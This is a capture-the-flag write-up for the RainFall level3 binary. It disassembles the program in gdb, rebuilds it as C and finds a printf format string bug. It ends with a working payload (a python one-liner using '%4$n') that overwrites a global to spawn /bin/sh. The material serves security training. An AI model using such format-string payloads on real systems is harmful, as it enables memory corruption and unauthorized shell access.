
Dump of assembler code for function main:
   0x0804851a <+0>:	push   ebp
   0x0804851b <+1>:	mov    ebp,esp
   0x0804851d <+3>:	and    esp,0xfffffff0
   0x08048520 <+6>:	call   0x80484a4 <v>
   0x08048525 <+11>:	leave  
   0x08048526 <+12>:	ret    
End of assembler dump.

Nothing interesting here, we just call the v() function.

in C:

int main(void)
{
	v();
	return 0;
}


Dump of assembler code for function v:
   0x080484a4 <+0>:	push   ebp
   0x080484a5 <+1>:	mov    ebp,esp
   0x080484a7 <+3>:	sub    esp,0x218
   0x080484ad <+9>:	mov    eax,ds:0x8049860
   0x080484b2 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x080484b6 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x080484be <+26>:	lea    eax,[ebp-0x208]
   0x080484c4 <+32>:	mov    DWORD PTR [esp],eax
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:	lea    eax,[ebp-0x208]
   0x080484d2 <+46>:	mov    DWORD PTR [esp],eax
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
   0x080484da <+54>:	mov    eax,ds:0x804988c
   0x080484df <+59>:	cmp    eax,0x40
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   0x080484e4 <+64>:	mov    eax,ds:0x8049880
   0x080484e9 <+69>:	mov    edx,eax
   0x080484eb <+71>:	mov    eax,0x8048600
   0x080484f0 <+76>:	mov    DWORD PTR [esp+0xc],edx
   0x080484f4 <+80>:	mov    DWORD PTR [esp+0x8],0xc
   0x080484fc <+88>:	mov    DWORD PTR [esp+0x4],0x1
   0x08048504 <+96>:	mov    DWORD PTR [esp],eax
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:	mov    DWORD PTR [esp],0x804860d
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave  
   0x08048519 <+117>:	ret    
End of assembler dump.

0x080484b2 <+14>:	mov    DWORD PTR [esp+0x8],eax
0x080484b6 <+18>:	mov    DWORD PTR [esp+0x4],0x200
0x080484be <+26>:	lea    eax,[ebp-0x208]
0x080484c4 <+32>:	mov    DWORD PTR [esp],eax
0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>

(gdb) x/s 0x8049860 0x8049860 <stdin@@GLIBC_2.0>: ""
we put stdin in eax (3rd argument)

0x080484b6 <+18>:	mov    DWORD PTR [esp+0x4],0x200
we put 0x200 as size of the buffer (2nd argument)

0x080484be <+26>:	lea    eax,[ebp-0x208]
we set [ebp-0x208] as the address for char *s (1st argument)

we call fgets : char *fgets(char *s, int size, FILE *stream);

0x080484cc <+40>:	lea    eax,[ebp-0x208]
0x080484d2 <+46>:	mov    DWORD PTR [esp],eax
0x080484d5 <+49>:	call   0x8048390 <printf@plt>

We call printf with the buffer directly as parameter, this is interesting because it is not a safe use of printf as said in man 3 printf:
   
Code such as printf(foo); often indicates a bug, since foo may contain a % character.  If  foo  comes  from
untrusted  user input, it may contain %n, causing the printf() call to write to memory and creating a security hole.

This is a format string vulnerability, that we could exploit!

lets check the end of the code first.


0x080484da <+54>:	mov    eax,ds:0x804988c
0x080484df <+59>:	cmp    eax,0x40
0x080484e2 <+62>:	jne    0x8048518 <v+116>

If the value contained in the memory address 0x804988c is not equal to 0x40 (64), jump to 116 (leave)

Otherwise:

0x080484e4 <+64>:	mov    eax,ds:0x8049880
0x080484e9 <+69>:	mov    edx,eax
0x080484eb <+71>:	mov    eax,0x8048600
0x080484f0 <+76>:	mov    DWORD PTR [esp+0xc],edx
0x080484f4 <+80>:	mov    DWORD PTR [esp+0x8],0xc
0x080484fc <+88>:	mov    DWORD PTR [esp+0x4],0x1
0x08048504 <+96>:	mov    DWORD PTR [esp],eax
0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
0x0804850c <+104>:	mov    DWORD PTR [esp],0x804860d
0x08048513 <+111>:	call   0x80483c0 <system@plt>

(gdb) x/s 0x8048600 0x8048600: "Wait what?!\n"
(gdb) x/s 0x804860d 0x804860d: "/bin/sh"

This part writes "Wait what?!\n" and then launches a shell.


in C :

void v(void)
{
	char buffer[512];

	fgets(buffer, 0x200, stdin);

	printf(buffer);

	if (target == 0x40)
	{
		fwrite("Wait what?!\n", 1, 0xc, stdout);
		system("/bin/sh");
	}
}



This means that we want the value contained by 0x804988c to be equal to 0x40 to reach it.

For that we will use the format string vulnerability of printf.

Lets try to see if we can which address corresponds to some data we input in the buffer.

level3@RainFall:~$ ./level3 
AAAA %x %x %x %x
AAAA 200 b7fd1ac0 b7ff37d0 41414141

There it is ! the 4th argument corresponds to our first input

We now need to use printf to insert a value, luckily it can be done with %n, which writes the number of characters printed so far to the memory address provided as its argument

%4$n tells printf to use its 4th argument as the destination address for %n.

now lets make our 1st input equal to 0x804988c (reversed because of little endian)
--> "\x8c\x98\x04\x08"

We need to add 60 bytes of padding so that %n will be equal to 64, and this will overwrite the content of the 0x804988c with 0x40 , allowing us to use a shell.

python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/exploit

then run cat /tmp/exploit - | ./level3 
